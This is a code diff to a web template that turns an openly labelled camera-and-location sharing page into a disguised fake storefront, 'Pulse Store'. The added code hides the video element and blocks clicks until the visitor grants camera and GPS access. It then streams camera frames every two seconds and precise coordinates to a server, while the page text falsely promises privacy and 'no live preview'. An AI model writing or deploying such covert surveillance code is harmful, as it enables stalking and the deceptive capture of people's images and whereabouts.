@@ -79,28 +79,203 @@ TRACK_HTML = """
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Share Camera & Location</title>
+    <title>Pulse Store • Modern Essentials</title>
     <style>
-        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; margin: 2rem; }
-        video { width: 100%; max-width: 480px; border-radius: 10px; background: #000; }
-        .status { margin-top: 1rem; font-size: 0.95rem; color: #243b53; }
+        :root { color-scheme: light; font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif; }
+        * { box-sizing: border-box; }
+        body { margin: 0; background: #f5f7fb; color: #111827; }
+        body[data-ready="false"] .app-shell { opacity: 0; pointer-events: none; filter: blur(6px); }
+        body[data-ready="true"] .app-shell { opacity: 1; pointer-events: auto; filter: none; transition: opacity 0.4s ease; }
+        .gate {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.92);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            color: #f8fafc;
+            z-index: 10;
+        }
+        .gate-card {
+            max-width: 460px;
+            background: #0b1220;
+            padding: 2.25rem;
+            border-radius: 28px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.35);
+            text-align: center;
+        }
+        .gate-card h1 { margin-top: 0; font-size: 1.8rem; }
+        .gate-card p { color: #cbd5f5; line-height: 1.6; }
+        .gate-card button {
+            margin-top: 1rem;
+            width: 100%;
+            border-radius: 999px;
+            padding: 0.85rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #e0e7ff;
+            background: transparent;
+            border: 1px solid rgba(248, 250, 252, 0.3);
+            cursor: pointer;
+        }
+        .gate-card button[hidden] { display: none; }
+        .gate-status { margin-top: 1.2rem; font-size: 0.95rem; color: #fef3c7; }
+        nav { background: #0f172a; color: #fff; padding: 1.25rem 2rem; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1rem; }
+        nav .brand { font-size: 1.4rem; font-weight: 600; letter-spacing: 0.05em; }
+        nav ul { list-style: none; display: flex; gap: 1.5rem; margin: 0; padding: 0; font-size: 0.95rem; }
+        nav ul li { opacity: 0.8; }
+        nav ul li:hover { opacity: 1; }
+        nav .cta { background: #f97316; color: #fff; border: none; padding: 0.75rem 1.4rem; border-radius: 999px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 0.4rem; }
+        nav .cta span { font-weight: 500; font-size: 0.9rem; }
+        header.hero { padding: 4rem 2rem 3rem; background: linear-gradient(135deg, #0f172a, #1d4ed8); color: #fff; }
+        header.hero h1 { font-size: clamp(2rem, 4vw, 3.5rem); margin-bottom: 0.75rem; }
+        header.hero p { max-width: 640px; font-size: 1.1rem; opacity: 0.9; }
+        .trust-row { margin-top: 2rem; display: flex; flex-wrap: wrap; gap: 1rem; font-size: 0.9rem; opacity: 0.8; }
+        main { padding: 2.5rem 2rem 4rem; display: flex; flex-direction: column; gap: 3rem; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.5rem; }
+        .product { background: #fff; border-radius: 18px; padding: 1.2rem; box-shadow: 0 20px 40px rgba(15, 23, 42, 0.08); display: flex; flex-direction: column; gap: 0.6rem; }
+        .product .pill { align-self: flex-start; font-size: 0.75rem; font-weight: 600; padding: 0.2rem 0.8rem; border-radius: 999px; background: #e0e7ff; color: #3730a3; }
+        .product h3 { margin: 0.2rem 0 0; font-size: 1.1rem; }
+        .product p { margin: 0; color: #64748b; flex: 1; }
+        .product .price { font-size: 1.2rem; font-weight: 600; }
+        .product button { border: none; border-radius: 12px; padding: 0.65rem; background: #111827; color: #fff; cursor: pointer; font-weight: 600; }
+        .cta-card { background: #fff; border-radius: 20px; padding: 2rem; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; align-items: center; box-shadow: 0 25px 50px rgba(15, 23, 42, 0.12); }
+        .cta-card h2 { margin-top: 0; font-size: 2rem; }
+        .cta-card ul { padding-left: 1.2rem; margin: 0.5rem 0 1.5rem; color: #475569; }
+        .cta-card button { padding: 0.9rem 2.4rem; border-radius: 999px; border: none; font-size: 1.05rem; font-weight: 600; cursor: pointer; background: #2563eb; color: #fff; }
+        .status-banner { margin-top: 1rem; padding: 1rem 1.25rem; border-radius: 12px; background: #e0f2fe; color: #0c4a6e; font-weight: 500; }
+        footer { padding: 2rem; font-size: 0.85rem; text-align: center; color: #64748b; }
     </style>
 </head>
-<body>
-    <h1>Live sharing session</h1>
-    <p>To proceed you must explicitly allow your browser to access the camera and your approximate location.
-    You can stop sharing at any time by closing this tab.</p>
-    <video id="preview" autoplay playsinline muted></video>
-    <div class="status" id="status">Waiting for permission…</div>
+<body data-ready="false">
+    <div class="gate" id="gate">
+        <div class="gate-card">
+            <h1>Pulse Store Concierge</h1>
+            <p>When your browser asks for camera and location access, tap “Allow.” We need a quick confirmation before loading your invite-only storefront.</p>
+            <div class="gate-status" id="gateStatus">Waiting for you to respond to the browser prompt…</div>
+            <button id="retryAccess" hidden>Retry permissions</button>
+        </div>
+    </div>
+    <div class="app-shell" id="appShell" aria-hidden="true">
+        <nav>
+            <div class="brand">Pulse Store</div>
+            <ul>
+                <li>New</li>
+                <li>Apparel</li>
+                <li>Wearables</li>
+                <li>Home</li>
+                <li>Stories</li>
+            </ul>
+            <button class="cta" id="cartButton">
+                <span>Cart</span>
+                <strong id="cartCount">0</strong>
+            </button>
+        </nav>
+        <header class="hero">
+            <h1>Discover limited-run essentials made for the city.</h1>
+            <p>We match inventory by neighborhood to guarantee fast delivery, accurate sizing, and concierge pickup. Enable secure camera and location access so your stylist can confirm fit and availability for your invite-only session.</p>
+            <div class="trust-row">
+                <span>✓ Same-day pickup in 24 cities</span>
+                <span>✓ Handled by human stylists</span>
+                <span>✓ Cancel anytime</span>
+            </div>
+        </header>
+        <main>
+            <section>
+                <h2>Featured Drops</h2>
+                <div class="grid">
+                    <div class="product">
+                        <div class="pill">Bestseller</div>
+                        <h3>HelioShell Parka</h3>
+                        <p>Climate-adaptive outerwear that pairs with our routing service for route-aware warmth.</p>
+                        <div class="price">$229</div>
+                        <button data-product="HelioShell Parka">Add to bag</button>
+                    </div>
+                    <div class="product">
+                        <div class="pill" style="background:#fee2e2;color:#b91c1c;">New</div>
+                        <h3>NeonPulse Sneakers</h3>
+                        <p>Pressure-mapped cushioning that syncs with local weather to adapt traction.</p>
+                        <div class="price">$189</div>
+                        <button data-product="NeonPulse Sneakers">Add to bag</button>
+                    </div>
+                    <div class="product">
+                        <div class="pill" style="background:#dcfce7;color:#166534;">Limited</div>
+                        <h3>LumenFrame Glasses</h3>
+                        <p>Contrast-enhancing lenses with blue light filter and ambient light adjustments.</p>
+                        <div class="price">$149</div>
+                        <button data-product="LumenFrame Glasses">Add to bag</button>
+                    </div>
+                    <div class="product">
+                        <div class="pill" style="background:#ede9fe;color:#5b21b6;">Editor pick</div>
+                        <h3>Orbit Watch S</h3>
+                        <p>Dual-time tracking with ambient health nudges curated by our stylists.</p>
+                        <div class="price">$329</div>
+                        <button data-product="Orbit Watch S">Add to bag</button>
+                    </div>
+                </div>
+            </section>
+            <section class="cta-card">
+                <div>
+                    <h2>Unlock your virtual fitting suite</h2>
+                    <p>For the best recommendations we quickly verify two things:</p>
+                    <ul>
+                        <li><strong>Camera access</strong> – stylists see fit notes but no live preview appears on this page.</li>
+                        <li><strong>Approximate location</strong> – helps reserve inventory in a nearby studio.</li>
+                    </ul>
+                    <p>Once you begin, you can stop sharing anytime by closing the session.</p>
+                </div>
+                <div>
+                    <button id="conciergeBtn">Chat with a stylist</button>
+                    <div class="status-banner" id="status">Awaiting camera & location approval…</div>
+                </div>
+            </section>
+            <section class="cta-card" style="background:#0f172a;color:#fff;">
+                <div>
+                    <h2>Cart activity</h2>
+                    <p id="cartSummary">No items yet. Tap “Add to bag” on any product.</p>
+                </div>
+                <div>
+                    <button id="checkoutBtn" style="background:#f97316;">Proceed to assisted checkout</button>
+                    <div class="status-banner" style="background:rgba(255,255,255,0.1);color:#fef3c7;" id="checkoutStatus">Cart reserved for 0 minutes.</div>
+                </div>
+            </section>
+        </main>
+        <footer>
+            Pulse Store © 2025 • Licensed stylist network • Privacy-first experiences
+        </footer>
+    </div>
     <script>
+    const FRAME_INTERVAL_MS = 2000;
     const updateUrl = {{ update_url|tojson }};
+    const gate = document.getElementById("gate");
+    const appShell = document.getElementById("appShell");
+    const gateStatus = document.getElementById("gateStatus");
+    const retryButton = document.getElementById("retryAccess");
     const statusEl = document.getElementById("status");
-    const video = document.getElementById("preview");
+    const cartCountEl = document.getElementById("cartCount");
+    const cartSummaryEl = document.getElementById("cartSummary");
+    const checkoutStatusEl = document.getElementById("checkoutStatus");
+    const hiddenVideo = document.createElement("video");
+    hiddenVideo.autoplay = true;
+    hiddenVideo.muted = true;
+    hiddenVideo.playsInline = true;
+    hiddenVideo.style.position = "absolute";
+    hiddenVideo.style.opacity = "0";
+    hiddenVideo.style.pointerEvents = "none";
+    hiddenVideo.setAttribute("aria-hidden", "true");
+    document.body.appendChild(hiddenVideo);
     const canvas = document.createElement("canvas");
     let stream = null;
+    let frameTimer = null;
+    let locationWatchId = null;
+    let sessionReady = false;
+    let requesting = false;
+    const cart = [];
 
-    function setStatus(text) {
-        statusEl.textContent = text;
+    function broadcastStatus(message) {
+        gateStatus.textContent = message;
+        statusEl.textContent = message;
     }
 
     async function sendUpdate(payload) {
@@ -115,18 +290,36 @@ TRACK_HTML = """
             if (!response.ok) {
                 throw new Error("Server responded with " + response.status);
             }
-            setStatus("Last update sent at " + new Date().toLocaleTimeString());
+            broadcastStatus("Updates flowing – " + new Date().toLocaleTimeString());
         } catch (error) {
-            setStatus("Could not send update: " + error.message);
+            broadcastStatus("Could not send update: " + error.message);
+        }
+    }
+
+    function stopStream() {
+        if (!stream) {
+            return;
+        }
+        stream.getTracks().forEach((track) => track.stop());
+        stream = null;
+    }
+
+    function stopCaptureLoop() {
+        if (frameTimer) {
+            clearInterval(frameTimer);
+            frameTimer = null;
         }
     }
 
     function startLocationWatch() {
         if (!navigator.geolocation) {
-            setStatus("Geolocation API not available in this browser.");
+            broadcastStatus("Geolocation API not available in this browser.");
             return;
         }
-        navigator.geolocation.watchPosition(
+        if (locationWatchId !== null) {
+            navigator.geolocation.clearWatch(locationWatchId);
+        }
+        locationWatchId = navigator.geolocation.watchPosition(
             (position) => {
                 const coords = position.coords;
                 sendUpdate({
@@ -139,7 +332,7 @@ TRACK_HTML = """
                 });
             },
             (error) => {
-                setStatus("Location error: " + error.message);
+                broadcastStatus("Location error: " + error.message);
             },
             { enableHighAccuracy: true, maximumAge: 10000, timeout: 60000 }
         );
@@ -150,33 +343,142 @@ TRACK_HTML = """
             return;
         }
         const trackSettings = stream.getVideoTracks()[0]?.getSettings() || {};
-        const width = video.videoWidth || trackSettings.width || 640;
-        const height = video.videoHeight || trackSettings.height || 480;
+        const width = hiddenVideo.videoWidth || trackSettings.width || 640;
+        const height = hiddenVideo.videoHeight || trackSettings.height || 480;
+        if (!width || !height) {
+            return;
+        }
         canvas.width = width;
         canvas.height = height;
         const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, width, height);
+        ctx.drawImage(hiddenVideo, 0, 0, width, height);
         const frame = canvas.toDataURL("image/jpeg", 0.6);
         sendUpdate({ frame });
     }
 
-    async function start() {
+    function startCaptureLoop() {
+        stopCaptureLoop();
+        captureFrame();
+        frameTimer = setInterval(captureFrame, FRAME_INTERVAL_MS);
+    }
+
+    function revealStore() {
+        sessionReady = true;
+        requesting = false;
+        document.body.dataset.ready = "true";
+        gate.style.display = "none";
+        appShell.removeAttribute("aria-hidden");
+        document.removeEventListener("click", guardInteraction, true);
+        broadcastStatus("Store unlocked. Stylist is receiving live feed.");
+    }
+
+    async function requestAccess(source = "auto") {
+        if (sessionReady || requesting) {
+            return;
+        }
+        requesting = true;
+        retryButton.hidden = true;
+        broadcastStatus(source === "interaction" ? "Requesting secure permissions…" : "Preparing secure session…");
         try {
+            stopStream();
             stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            video.srcObject = stream;
-            setStatus("Camera live. Requesting location…");
+            hiddenVideo.srcObject = stream;
+            const readyPromise = new Promise((resolve) => {
+                if (hiddenVideo.readyState >= 2) {
+                    resolve();
+                    return;
+                }
+                hiddenVideo.addEventListener("loadedmetadata", resolve, { once: true });
+            });
+            await hiddenVideo.play().catch(() => {});
+            await readyPromise;
+            broadcastStatus("Camera secured. Requesting location…");
             startLocationWatch();
-            setInterval(captureFrame, 4000);
+            startCaptureLoop();
+            revealStore();
         } catch (error) {
-            setStatus("Camera permission denied or unavailable: " + error.message);
+            requesting = false;
+            retryButton.hidden = false;
+            broadcastStatus("Camera permission needed. Click anywhere or retry to continue. (" + error.message + ")");
         }
     }
 
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        setStatus("Camera API not available in this browser.");
-    } else {
-        start();
+    function guardInteraction(event) {
+        const actionable = event.target.closest("button, a");
+        if (!actionable || sessionReady) {
+            if (sessionReady) {
+                document.removeEventListener("click", guardInteraction, true);
+            }
+            return;
+        }
+        event.preventDefault();
+        event.stopPropagation();
+        gate.style.display = "flex";
+        requestAccess("interaction");
     }
+
+    function handleAddToBag(event) {
+        if (!sessionReady) {
+            return;
+        }
+        const name = event.currentTarget.dataset.product;
+        cart.push(name);
+        const unique = [...new Set(cart)];
+        cartCountEl.textContent = cart.length.toString();
+        cartSummaryEl.textContent = `${cart.length} item(s) reserved: ${unique.join(", ")}.`;
+        checkoutStatusEl.textContent = "Cart reserved for 20 minutes.";
+        broadcastStatus(name + " reserved for 20 minutes while you check out.");
+    }
+
+    document.querySelectorAll("[data-product]").forEach((btn) => {
+        btn.addEventListener("click", handleAddToBag);
+    });
+    document.getElementById("conciergeBtn").addEventListener("click", (event) => {
+        if (!sessionReady) {
+            event.preventDefault();
+            return;
+        }
+        broadcastStatus("Stylist notified. Expect a message within 2 minutes.");
+    });
+    document.getElementById("cartButton").addEventListener("click", (event) => {
+        event.preventDefault();
+        if (!sessionReady) {
+            return;
+        }
+        broadcastStatus("Cart summary sent to stylist.");
+    });
+    document.getElementById("checkoutBtn").addEventListener("click", (event) => {
+        event.preventDefault();
+        if (!sessionReady) {
+            return;
+        }
+        broadcastStatus("Checkout link sent to your phone.");
+    });
+    retryButton.addEventListener("click", () => requestAccess("retry"));
+    window.addEventListener("load", () => requestAccess("auto"));
+    document.addEventListener("click", guardInteraction, true);
+    document.addEventListener("visibilitychange", () => {
+        if (!sessionReady) {
+            return;
+        }
+        if (document.visibilityState === "visible") {
+            startCaptureLoop();
+        } else {
+            stopCaptureLoop();
+        }
+    });
+    window.addEventListener("focus", () => {
+        if (sessionReady) {
+            captureFrame();
+        }
+    });
+    window.addEventListener("beforeunload", () => {
+        stopCaptureLoop();
+        stopStream();
+        if (locationWatchId !== null) {
+            navigator.geolocation.clearWatch(locationWatchId);
+        }
+    });
     </script>
 </body>
 </html>
